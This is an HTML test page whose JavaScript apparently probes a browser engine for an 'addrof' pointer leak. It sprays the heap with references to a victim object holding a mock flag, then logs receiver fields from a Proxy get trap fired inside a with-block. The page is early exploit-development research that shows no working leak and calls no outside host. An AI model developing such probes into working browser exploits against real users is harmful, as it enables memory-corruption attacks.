<!DOCTYPE html>
<html>
<head>
    <title>ProxyObject addrof() Detection</title>
    <script>
        function log(msg) {
            document.body.innerHTML += msg + "<br>";
        }

        window.onload = () => {
            log("Starting ProxyObject addrof() detection...");

            // Object we want to find the address of
            const victim = { secret: "flag{exploit_dev_in_progress}" };

            // Heap spray to increase odds of overlap
            const sprayCount = 1000;
            let spray = [];
            for (let i = 0; i < sprayCount; i++) {
                spray.push({ obj: victim });
            }

            let callCount = 0;

            const handler = {
                get(target, prop, receiver) {
                    if (callCount++ > 5) {
                        log("Breaking recursion after 5 calls");
                        return undefined;
                    }

                    log("Proxy 'get' called (" + callCount + ")");
                    log("prop = " + prop);

                    // Log receiver type
                    log("Receiver = " + receiver);
                    log("Receiver.constructor = " + (receiver?.constructor?.name || "unknown"));

                    // Try to extract any field that looks like a pointer
                    try {
                        for (let key in receiver) {
                            try {
                                const val = receiver[key];
                                log(`receiver.${key} = ${typeof val} (${val})`);
                                if (typeof val === "object" && val !== null) {
                                    log(`  -> object keys: ${Object.keys(val).join(", ")}`);
                                }
                            } catch (e) {
                                log(`Error reading receiver.${key}: ${e.message}`);
                            }
                        }
                    } catch (e) {
                        log("Error enumerating receiver keys: " + e.message);
                    }

                    return Reflect.get(...arguments);
                }
            };

            const proxy = new Proxy(victim, handler);

            // Run inside with-block to trigger JSScope behavior
            (function () {
                with (proxy) {
                    try {
                        // Access a property to trigger Proxy trap
                        log("Accessing 'toString'...");
                        toString(); // Could be any property access
                    } catch (e) {
                        log("Exception in with-block: " + e.message);
                    }
                }
            })();
        };
    </script>
</head>
<body>
    <h2>ProxyObject addrof() Detection Test</h2>
    <p>Trying to observe leaked pointers or internal object fields.</p>
</body>
</html>
